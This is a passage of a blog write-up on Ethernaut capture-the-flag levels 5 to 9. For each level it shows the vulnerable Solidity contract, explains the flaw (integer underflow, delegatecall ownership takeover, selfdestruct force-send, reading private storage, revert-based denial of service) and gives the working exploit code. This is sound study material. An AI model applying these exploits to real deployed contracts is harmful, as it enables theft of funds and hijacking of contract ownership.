+<h2 id="5-Token"><a href="#5-Token" class="headerlink" title="5 - Token"></a>5 - Token</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Token</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">uint _initialSupply</span>) public &#123;</span><br><span class="line">    balances[msg.<span class="property">sender</span>] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address _to, uint _value</span>) public returns (bool) &#123;</span><br><span class="line">    <span class="built_in">require</span>(balances[msg.<span class="property">sender</span>] - _value &gt;= <span class="number">0</span>);</span><br><span class="line">    balances[msg.<span class="property">sender</span>] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address _owner</span>) public view returns (uint balance) &#123;</span><br><span class="line">    <span class="keyword">return</span> balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>In this challenge we are given 20 tokens and that is the <code>toatalSupply</code> which means only 20 tokens are in existance, but somehow we need to get more tokens into our account to win this challenge. since this contract is not using <code>SafeMath</code> library integer <strong>overflow</strong> and <strong>underflow</strong> is possible, simply by transfering <code>21 tokens</code> to some other address makes the contract to subtract 21 tokens from our accout. since our balance is 20 and subtracting 21 make the value <code>(-1) % 2**256</code> which is greater than <code>0</code> and passes the requirement of the <code>transaction()</code> funciton and increases our balance more than 20.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">transfer</span>(instance,<span class="number">21</span>)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="6-Delegation"><a href="#6-Delegation" class="headerlink" title="6 - Delegation"></a>6 - Delegation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Delegate</span> &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address _owner</span>) &#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">pwn</span>(<span class="params"></span>) public &#123;</span><br><span class="line">    owner = msg.<span class="property">sender</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Delegation</span> &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  <span class="title class_">Delegate</span> delegate;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address _delegateAddress</span>) &#123;</span><br><span class="line">    delegate = <span class="title class_">Delegate</span>(_delegateAddress);</span><br><span class="line">    owner = msg.<span class="property">sender</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">fallback</span>() external &#123;</span><br><span class="line">    (bool result,) = <span class="title function_">address</span>(delegate).<span class="title function_">delegatecall</span>(msg.<span class="property">data</span>);</span><br><span class="line">    <span class="keyword">if</span> (result) &#123;</span><br><span class="line">      <span class="variable language_">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>This contract’s <code>fallback()</code> function uses the <code>delegatecall</code> to call the <code>delegate contract</code> with the data that we sent, so in simple words <strong>we can execute any function in the <code>delegate</code> contract with context of <code>delegation</code> contract</strong>, here the context also includes storage of the contract that means if we change the variable in <code>delegate</code> contract using the <code>delegatecall</code> from <code>delegation</code> contract the result of change is done in the <code>delegation</code> contract. so, executing the <code>pwn()</code> function through the <code>delegatecall</code> from <code>delegation</code> contract makes us the owner of the <code>delegation</code> contract achieving our goal.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> <span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>: player, <span class="attr">to</span>: instance, <span class="attr">data</span>: <span class="string">&quot;0xdd365b8b&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="7-Force"><a href="#7-Force" class="headerlink" title="7 - Force"></a>7 - Force</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Force</span> &#123;<span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                   MEOW ?</span></span><br><span class="line"><span class="comment">         /\_/\   /</span></span><br><span class="line"><span class="comment">    ____/ o o \</span></span><br><span class="line"><span class="comment">  /~____  =ø= /</span></span><br><span class="line"><span class="comment"> (______)__m_m)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>The goal of this challenge is to force this contract to accept some ether, it is not possible in the general way since it has no payable function implemented not even <code>fallback</code> or a <code>receive</code> function. but there is a way we can froce this contract to accept funds that is by using <code>sefldestruct</code> function from another contract, that way the contract transfers all of it’s funds to given address no matter what.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Exploit</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address payable _address</span>) payable &#123;</span><br><span class="line">      <span class="title function_">selfdestruct</span>(_address);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="8-Vault"><a href="#8-Vault" class="headerlink" title="8 - Vault"></a>8 - Vault</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Vault</span> &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">bytes32 _password</span>) &#123;</span><br><span class="line">    locked = <span class="literal">true</span>;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">unlock</span>(<span class="params">bytes32 _password</span>) public &#123;</span><br><span class="line">    <span class="keyword">if</span> (password == _password) &#123;</span><br><span class="line">      locked = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>The goal of this challenge is to find the <code>password</code>and unlock the vault, since the <strong>password is a private variable</strong> contract doesn’t gives us the access, but the one thing we have to remember is this is an decentralised ethereum network and everything in here is in plaintext and not encryted and <strong>anyone can read the data from blockchain database</strong>. so we can simply read the password from the database and unlock the vault to achieve our goal.</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">In [<span class="number">101</span>]: <span class="keyword">from</span> web3.middleware <span class="keyword">import</span> geth_poa_middleware</span><br><span class="line"></span><br><span class="line">In [<span class="number">102</span>]: <span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line">In [<span class="number">103</span>]: url = <span class="string">&#x27;https://sepolia.infura.io/v3/e1881826831143f285a553a9a8f5a308&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">104</span>]: io = Web3(Web3.HTTPProvider(url))</span><br><span class="line"></span><br><span class="line">In [<span class="number">105</span>]: io.middleware_onion.inject(geth_poa_middleware, layer=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">106</span>]: ad = <span class="string">&#x27;0x094C2Afb0eF4711f8DeF82Ab727A19AE4F41C27d&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">107</span>]: io.eth.get_storage_at(ad,<span class="number">0</span>)       <span class="comment"># this slot stores the locked bool</span></span><br><span class="line">Out[<span class="number">107</span>]: HexBytes(<span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000001&#x27;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">108</span>]: io.eth.get_storage_at(ad,<span class="number">1</span>)       <span class="comment"># this slot stores the password</span></span><br><span class="line">Out[<span class="number">108</span>]: HexBytes(<span class="string">&#x27;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">unlock</span>(<span class="string">&#x27;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="9-King"><a href="#9-King" class="headerlink" title="9 - King"></a>9 - King</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">King</span> &#123;</span><br><span class="line"></span><br><span class="line">  address king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) payable &#123;</span><br><span class="line">    owner = msg.<span class="property">sender</span>;  </span><br><span class="line">    king = msg.<span class="property">sender</span>;</span><br><span class="line">    prize = msg.<span class="property">value</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">receive</span>() external payable &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.<span class="property">value</span> &gt;= prize || msg.<span class="property">sender</span> == owner);</span><br><span class="line">    <span class="title function_">payable</span>(king).<span class="title function_">transfer</span>(msg.<span class="property">value</span>);</span><br><span class="line">    king = msg.<span class="property">sender</span>;</span><br><span class="line">    prize = msg.<span class="property">value</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">_king</span>(<span class="params"></span>) public view returns (address) &#123;</span><br><span class="line">    <span class="keyword">return</span> king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Anyone who sends more than the <code>prize</code> ammount can become the <code>king</code> of this contract, but our goal is to block everyone from getting king and stay as a perminant king of this contract. to do that we can use the <code>revert</code> function in our contract to block the transfer this contract does when it changes the king. now our cantract is king since it does not receive any ether no one will be able to become the king of this contract.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Exploit</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address payable _address</span>) public payable &#123;</span><br><span class="line">        _address.<span class="property">call</span>&#123;<span class="attr">value</span>: <span class="number">0.001</span> ether&#125;(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">receive</span>() external payable &#123;</span><br><span class="line">        <span class="title function_">revert</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">tags</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-Hello-Ethernaut"><span class="toc-number">1.</span> <span class="toc-text">0 - Hello Ethernaut</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Fallback"><span class="toc-number">2.</span> <span class="toc-text">1 - Fallback</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Fallout"><span class="toc-number">3.</span> <span class="toc-text">2 - Fallout</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Coin-Flip"><span class="toc-number">4.</span> <span class="toc-text">3 - Coin Flip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Telephone"><span class="toc-number">5.</span> <span class="toc-text">4 - Telephone</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-Token"><span class="toc-number">6.</span> <span class="toc-text">5 - Token</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-Delegation"><span class="toc-number">7.</span> <span class="toc-text">6 - Delegation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-Force"><span class="toc-number">8.</span> <span class="toc-text">7 - Force</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-Vault"><span class="toc-number">9.</span> <span class="toc-text">8 - Vault</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-King"><span class="toc-number">10.</span> <span class="toc-text">9 - King</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/11/13/0-9-Ethernaut-CTF/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/11/13/0-9-Ethernaut-CTF/&text=0-9 Ethernaut CTF"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/11/13/0-9-Ethernaut-CTF/&title=0-9 Ethernaut CTF"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/11/13/0-9-Ethernaut-CTF/&is_video=false&description=0-9 Ethernaut CTF"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=0-9 Ethernaut CTF&body=Check out this article: http://example.com/2022/11/13/0-9-Ethernaut-CTF/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/11/13/0-9-Ethernaut-CTF/&title=0-9 Ethernaut CTF"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/11/13/0-9-Ethernaut-CTF/&title=0-9 Ethernaut CTF"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/11/13/0-9-Ethernaut-CTF/&title=0-9 Ethernaut CTF"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/11/13/0-9-Ethernaut-CTF/&title=0-9 Ethernaut CTF"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/11/13/0-9-Ethernaut-CTF/&name=0-9 Ethernaut CTF&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/11/13/0-9-Ethernaut-CTF/&t=0-9 Ethernaut CTF"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2022
+    Chandu Kona
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-4V3049N925"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-4V3049N925');
+    </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
